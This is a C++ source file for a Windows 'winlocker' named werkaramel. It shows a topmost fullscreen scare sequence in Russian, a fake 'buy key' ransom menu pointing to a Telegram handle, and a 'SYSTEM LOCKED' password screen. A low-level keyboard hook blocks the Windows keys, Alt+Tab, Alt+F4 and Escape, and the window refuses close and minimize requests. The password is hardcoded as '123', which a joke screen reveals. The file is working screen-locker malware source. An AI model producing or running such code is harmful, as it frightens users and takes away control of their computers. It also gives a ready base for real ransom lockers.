// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — fullscreen cinematic scare + menu + winlocker
#include <windows.h>
#include <windowsx.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <cmath>

const std::wstring PASS = L"123";

int g_phase = 0;   // 0=red, 1=glitch, 2=menu, 3=joke, 4=locker
std::wstring g_input;
bool g_wrong = false;
bool g_unlocked = false;
HHOOK g_kbHook = nullptr;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

const COLORREF C_BG       = RGB(0, 0, 0);
const COLORREF C_RED      = RGB(220, 30, 30);
const COLORREF C_RED_BG   = RGB(140, 10, 10);
const COLORREF C_RED_DARK = RGB(40, 5, 5);
const COLORREF C_GREEN    = RGB(40, 230, 90);
const COLORREF C_GREEN_DIM= RGB(20, 120, 45);
const COLORREF C_WHITE    = RGB(255, 255, 255);
const COLORREF C_DIM      = RGB(150, 150, 150);

// ── рисование текста ────────────────────────────────────────
void DrawStr(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
             int size, bool bold = false, bool center = false, int winW = 0) {
    HFONT font = CreateFontW(size, 0, 0, 0, bold ? FW_BOLD : FW_NORMAL,
                             FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH,
                             L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s.c_str(), (int)s.size());
    SelectObject(dc, old);
    DeleteObject(font);
}

// ── блокировка клавиш ───────────────────────────────────────
LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;

        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F11) return 1;
        if (vk == VK_ESCAPE) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

// ── фазы ────────────────────────────────────────────────────
void DrawPhase0(HDC dc, RECT rc, int frame) {
    // красный, пульсация
    int pulse = (int)(20 + 15 * sin(frame * 0.15));
    HBRUSH bg = CreateSolidBrush(RGB(140 + pulse, 5, 5));
    FillRect(dc, &rc, bg);
    DeleteObject(bg);

    DrawStr(dc, 0, rc.bottom / 2 - 60, L"ВАС ЗАМЕТИЛИ", C_WHITE,
            110, true, true, rc.right);

    DrawStr(dc, 0, rc.bottom / 2 + 70, L"не пытайтесь закрыть",
            RGB(255, 200, 200), 26, false, true, rc.right);
}

void DrawPhase1(HDC dc, RECT rc) {
    // глитч — рваные символы + шум
    const wchar_t* noise = L"!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`01ХАОС";
    int nlen = (int)wcslen(noise);

    // фон мерцает
    int r = RandInt(0, 80);
    HBRUSH bg = CreateSolidBrush(RGB(r, 0, 0));
    FillRect(dc, &rc, bg);
    DeleteObject(bg);

    // случайные символы
    for (int i = 0; i < 120; ++i) {
        int x = RandInt(0, rc.right - 30);
        int y = RandInt(0, rc.bottom - 30);
        std::wstring s(1, noise[RandInt(0, nlen - 1)]);
        COLORREF c = (RandInt(0, 1)) ? C_RED : C_WHITE;
        DrawStr(dc, x, y, s, c, RandInt(16, 36), true);
    }

    // иногда — горизонтальные полосы
    for (int i = 0; i < 5; ++i) {
        int y = RandInt(0, rc.bottom);
        RECT band{ 0, y, rc.right, y + RandInt(2, 8) };
        HBRUSH bb = CreateSolidBrush(RGB(255, RandInt(0, 40), RandInt(0, 40)));
        FillRect(dc, &band, bb);
        DeleteObject(bb);
    }
}

void DrawPhase2(HDC dc, RECT rc) {
    // чёрный фон, зелёный баннер, меню
    int cx = rc.right / 2;

    // WERKARAMEL
    DrawStr(dc, 0, 100, L"WERKARAMEL", C_GREEN, 110, true, true, rc.right);

    // подзаголовок
    DrawStr(dc, 0, 240, L"W I N L O C K E R", C_GREEN_DIM, 44, false, true, rc.right);

    // разделительная линия
    for (int x = cx - 400; x < cx + 400; x += 12)
        DrawStr(dc, x, 310, L"▬", C_GREEN_DIM, 14);

    // меню
    DrawStr(dc, 0, 360, L"Выберите действие:",
            C_WHITE, 32, false, true, rc.right);

    DrawStr(dc, cx - 320, 440, L"[ 1 ]   Поддержка  →  tg @werkaramel",
            C_WHITE, 28);
    DrawStr(dc, cx - 320, 500, L"[ 2 ]   Купить ключ",
            C_WHITE, 28);
    DrawStr(dc, cx - 320, 560, L"[ 3 ]   Выйти",
            C_WHITE, 28);

    DrawStr(dc, 0, rc.bottom - 100, L"нажмите  1  /  2  /  3",
            C_DIM, 24, false, true, rc.right);
}

void DrawPhase3(HDC dc, RECT rc) {
    DrawStr(dc, 0, 200, L"BUY KEY...", C_GREEN, 60, true, true, rc.right);
    DrawStr(dc, 0, 320, L"лан шучу братан, халявно", C_GREEN, 38, false, true, rc.right);
    DrawStr(dc, 0, 400, L"вот ключ:  123", C_WHITE, 72, true, true, rc.right);
    DrawStr(dc, 0, 510, L"удачи!", C_GREEN, 40, false, true, rc.right);
    DrawStr(dc, 0, 590, L"tg @werkaramel", C_GREEN_DIM, 30, false, true, rc.right);
}

void DrawPhase4(HDC dc, RECT rc) {
    int cx = rc.right / 2;

    // WERKARAMEL сверху
    DrawStr(dc, 0, 60, L"WERKARAMEL", C_RED, 60, true, true, rc.right);

    // разделитель
    for (int x = cx - 300; x < cx + 300; x += 12)
        DrawStr(dc, x, 150, L"▬", C_RED, 12);

    // SYSTEM LOCKED
    DrawStr(dc, 0, 200, L"SYSTEM LOCKED", C_RED, 110, true, true, rc.right);

    // подсказка
    DrawStr(dc, 0, 340, L"введите пароль для разблокировки",
            C_DIM, 26, false, true, rc.right);

    DrawStr(dc, 0, 380, L"tg: @werkaramel", C_RED, 28, false, true, rc.right);

    // поле ввода
    int boxW = 600, boxH = 80;
    int boxX = cx - boxW / 2;
    int boxY = rc.bottom / 2 + 60;
    RECT box{ boxX, boxY, boxX + boxW, boxY + boxH };

    HBRUSH bf = CreateSolidBrush(RGB(20, 20, 20));
    FillRect(dc, &box, bf);
    DeleteObject(bf);

    // двойная рамка
    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
    RECT box2 = box;
    InflateRect(&box2, 3, 3);
    FrameRect(dc, &box2, (HBRUSH)GetStockObject(GRAY_BRUSH));

    // ввод
    std::wstring masked(g_input.size(), L'*');
    DrawStr(dc, boxX + 30, boxY + 22, masked, C_WHITE, 40);

    // мигающий курсор
    static int cursorBlink = 0;
    cursorBlink++;
    if ((cursorBlink / 10) % 2 == 0) {
        int curX = boxX + 30;
        SIZE sz;
        HFONT font = CreateFontW(40, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                 DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                 CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                 DEFAULT_PITCH, L"Consolas");
        HFONT old = (HFONT)SelectObject(dc, font);
        GetTextExtentPoint32W(dc, masked.c_str(), (int)masked.size(), &sz);
        SelectObject(dc, old);
        DeleteObject(font);
        curX += sz.cx + 4;
        RECT cur{ curX, boxY + 20, curX + 3, boxY + boxH - 20 };
        HBRUSH cb = CreateSolidBrush(C_WHITE);
        FillRect(dc, &cur, cb);
        DeleteObject(cb);
    }

    // ошибка/подсказка
    if (g_wrong) {
        DrawStr(dc, 0, boxY + boxH + 30, L"НЕВЕРНЫЙ ПАРОЛЬ",
                C_RED, 28, true, true, rc.right);
    } else {
        DrawStr(dc, 0, boxY + boxH + 30, L"[ Enter ]  разблокировать",
                C_DIM, 22, false, true, rc.right);
    }
}

// ── окно ────────────────────────────────────────────────────
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    static std::chrono::steady_clock::time_point phase_start;
    static int frame = 0;

    switch (msg) {
    case WM_CREATE:
        phase_start = std::chrono::steady_clock::now();
        SetTimer(hwnd, 1, 33, nullptr);   // ~30 fps
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);

        // базовый фон
        COLORREF bg = C_BG;
        if (g_phase == 0) bg = C_RED_BG;
        HBRUSH hb = CreateSolidBrush(bg);
        FillRect(dc, &rc, hb);
        DeleteObject(hb);

        switch (g_phase) {
        case 0: DrawPhase0(dc, rc, frame); break;
        case 1: DrawPhase1(dc, rc); break;
        case 2: DrawPhase2(dc, rc); break;
        case 3: DrawPhase3(dc, rc); break;
        case 4: DrawPhase4(dc, rc); break;
        }
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_TIMER: {
        frame++;
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - phase_start).count();

        if (g_phase == 0 && elapsed >= 3000) {
            g_phase = 1;
            phase_start = std::chrono::steady_clock::now();
        } else if (g_phase == 1 && elapsed >= 4000) {
            g_phase = 2;
            phase_start = std::chrono::steady_clock::now();
        } else if (g_phase == 3 && elapsed >= 3000) {
            g_phase = 4;
            phase_start = std::chrono::steady_clock::now();
        }

        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    }

    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE && g_phase != 2 && g_phase != 3) return 0;
        return 0;

    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;

    case WM_CLOSE: return 0;

    case WM_CHAR: {
        if (g_phase == 2) {
            if (wp == L'1' || wp == L'2' || wp == L'3') {
                if (wp == L'2') {
                    g_phase = 3;
                } else {
                    g_phase = 4;
                }
                phase_start = std::chrono::steady_clock::now();
                InvalidateRect(hwnd, nullptr, FALSE);
            }
        } else if (g_phase == 4) {
            if (wp == VK_BACK) {
                if (!g_input.empty()) g_input.pop_back();
                g_wrong = false;
            } else if (wp == VK_RETURN) {
                if (g_input == PASS) {
                    g_unlocked = true;
                    UnhookWindowsHookEx(g_kbHook);
                    PostQuitMessage(0);
                } else {
                    g_input.clear();
                    g_wrong = true;
                    MessageBeep(MB_ICONHAND);
                }
            } else if (wp >= 32) {
                g_input.push_back((wchar_t)wp);
                g_wrong = false;
            }
            InvalidateRect(hwnd, nullptr, FALSE);
        }
        return 0;
    }

    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI wWinMain(HINSTANCE hi, HINSTANCE, PWSTR, int) {
    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hi;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"werkaramel";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST, L"werkaramel", L"werkaramel",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, hi, nullptr);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook, hi, 0);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return 0;
}
